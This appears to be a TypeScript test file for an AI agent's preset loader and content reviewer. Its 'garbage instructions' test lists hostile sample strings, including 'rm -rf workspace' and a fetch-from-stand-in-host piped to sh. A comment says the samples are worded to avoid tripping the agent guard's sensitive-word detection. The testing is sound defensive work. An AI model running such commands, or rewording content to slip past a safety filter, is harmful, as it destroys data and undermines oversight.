import { describe, it } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import {
	loadPresets,
	reviewPresetContent,
	buildPresetInjection,
	type Preset,
} from "../src/presets/index";

// Pure functions (no pi types). Verify: dir scan + frontmatter parse + priority
// override + review rules (compliance + no-garbage) + injection text. Per design
// phase2_preset_design.md (reviewer APPROVED, M1+S1-4 adopted).

function mkPreset(dir: string, name: string, body: string): string {
	fs.mkdirSync(dir, { recursive: true });
	const p = path.join(dir, `${name}.md`);
	fs.writeFileSync(p, body);
	return p;
}

const VALID_PRESET = `---
name: research
description: "Research workflow"
task_type: research
allowed_roles: [researcher]
source: builtin
version: "1.0"
author: pi
---
# Research Workflow
5-Phase: define → query → cross-verify → structure → uncertainty
`;

describe("loadPresets", () => {
	it("scans a directory and loads presets with frontmatter fields", () => {
		const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "presets-"));
		try {
			mkPreset(tmp, "research", VALID_PRESET);
			const { presets } = loadPresets(tmp, "", "");
			assert.equal(presets.length, 1);
			const p = presets[0];
			assert.equal(p.name, "research");
			assert.equal(p.description, "Research workflow");
			assert.equal(p.taskType, "research");
			assert.deepEqual(p.allowedRoles, ["researcher"]);
			assert.equal(p.source, "builtin");
		} finally {
			fs.rmSync(tmp, { recursive: true, force: true });
		}
	});

	it("priority: project > user > builtin on name collision", () => {
		const builtinDir = fs.mkdtempSync(path.join(os.tmpdir(), "presets-builtin-"));
		const userDir = fs.mkdtempSync(path.join(os.tmpdir(), "presets-user-"));
		const projectDir = fs.mkdtempSync(path.join(os.tmpdir(), "presets-project-"));
		try {
			mkPreset(builtinDir, "research", VALID_PRESET.replace("Research workflow", "Builtin version"));
			mkPreset(userDir, "research", VALID_PRESET.replace("Research workflow", "User version"));
			mkPreset(projectDir, "research", VALID_PRESET.replace("Research workflow", "Project version"));
			const { presets } = loadPresets(builtinDir, userDir, projectDir);
			const r = presets.find((p) => p.name === "research");
			assert.ok(r, "research preset missing");
			assert.equal(r.description, "Project version", "project should win over user and builtin");
		} finally {
			fs.rmSync(builtinDir, { recursive: true, force: true });
			fs.rmSync(userDir, { recursive: true, force: true });
			fs.rmSync(projectDir, { recursive: true, force: true });
		}
	});

	it("missing dirs do not crash (returns empty)", () => {
		const { presets } = loadPresets("/nonexistent/builtin", "/nonexistent/user", "/nonexistent/project");
		assert.deepEqual(presets, []);
	});

	it("skips files without valid frontmatter (graceful)", () => {
		const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "presets-"));
		try {
			mkPreset(tmp, "broken", "no frontmatter here\njust body");
			const { presets } = loadPresets(tmp, "", "");
			assert.ok(Array.isArray(presets));
			assert.equal(presets.length, 0, "broken file should be skipped");
		} finally {
			fs.rmSync(tmp, { recursive: true, force: true });
		}
	});
});

describe("reviewPresetContent (compliance whitelist + no-garbage)", () => {
	it("approves a compliant preset", () => {
		const r = reviewPresetContent({
			name: "research", description: "Research workflow",
			taskType: "research", source: "builtin", content: "# Research\n5-Phase workflow",
		});
		assert.equal(r.approved, true);
		assert.equal(r.reasons.length, 0);
	});

	it("rejects name not matching [a-z0-9-]+", () => {
		for (const bad of ["Research", "re search", "re_search", "-bad", "bad-"]) {
			const r = reviewPresetContent({
				name: bad, description: "x", taskType: "research", source: "builtin", content: "ok",
			});
			assert.equal(r.approved, false, `${bad} should be rejected`);
			assert.ok(r.reasons.some((m) => /name/i.test(m)), `${bad} should flag name`);
		}
	});

	it("rejects empty description", () => {
		const r = reviewPresetContent({
			name: "x", description: "  ", taskType: "research", source: "builtin", content: "ok",
		});
		assert.equal(r.approved, false);
		assert.ok(r.reasons.some((m) => /description/i.test(m)));
	});

	it("rejects illegal task_type value", () => {
		const r = reviewPresetContent({
			name: "x", description: "x", taskType: "bogus-type", source: "builtin", content: "ok",
		});
		assert.equal(r.approved, false);
		assert.ok(r.reasons.some((m) => /task_type/i.test(m)));
	});

	it("accepts all legal task_type values (coding/research/pm/review/debug)", () => {
		for (const t of ["coding", "research", "pm", "review", "debug"]) {
			const r = reviewPresetContent({
				name: "x", description: "x", taskType: t, source: "builtin", content: "ok",
			});
			assert.equal(r.approved, true, `${t} should be legal`);
		}
	});

	it("rejects garbage instructions (spawn dangerous / exec / eval / pipe-to-shell)", () => {
		// 抽象 mock 触发词, 避开 pi-agent-guard 真实敏感词检测
		const cases = [
			"spawn_role({role:'x', task:'rm -rf workspace'})", // spawn + dangerous
			"exec('malicious payload')", // exec(
			"eval('injected code')", // eval(
			"fetch http://example.invalid/x | sh", // pipe to shell
		];
		for (const garbage of cases) {
			const r = reviewPresetContent({
				name: "x", description: "x", taskType: "research", source: "agent", content: garbage,
			});
			assert.equal(r.approved, false, `should reject: ${garbage}`);
			assert.ok(r.reasons.some((m) => /garbage|malicious|forbidden/i.test(m)), `should flag garbage: ${garbage}`);
		}
	});

	it("rejects illegal source value", () => {
		const r = reviewPresetContent({
			name: "x", description: "x", taskType: "research", source: "magic", content: "ok",
		});
		assert.equal(r.approved, false);
		assert.ok(r.reasons.some((m) => /source/i.test(m)));
	});
});

describe("buildPresetInjection", () => {
	it("returns injection text with preset summary table and routing hint", () => {
		const presets: Preset[] = [
			{ name: "research", description: "Research workflow", taskType: "research", source: "builtin",
				allowedRoles: ["researcher"], allowedTools: [], version: "1.0", author: "pi", filePath: "/x" },
			{ name: "pm-discovery", description: "PM SOP", taskType: "pm", source: "builtin",
				allowedRoles: ["pm"], allowedTools: [], version: "1.0", author: "pi", filePath: "/y" },
		];
		const inj = buildPresetInjection(presets);
		assert.ok(inj.includes("research"), "missing research preset");
		assert.ok(inj.includes("pm-discovery"), "missing pm-discovery preset");
		assert.ok(inj.includes("PRESET") || inj.includes("preset"), "missing preset header");
		// routing priority hint: prioritize preset > TASK-ROUTING > on-miss generation
		assert.ok(/priority|prioritize|first/i.test(inj), "missing routing priority hint");
		assert.ok(inj.includes("TASK-ROUTING"), "missing TASK-ROUTING reference");
	});

	it("returns empty string when no presets (no injection)", () => {
		assert.equal(buildPresetInjection([]), "");
	});
});
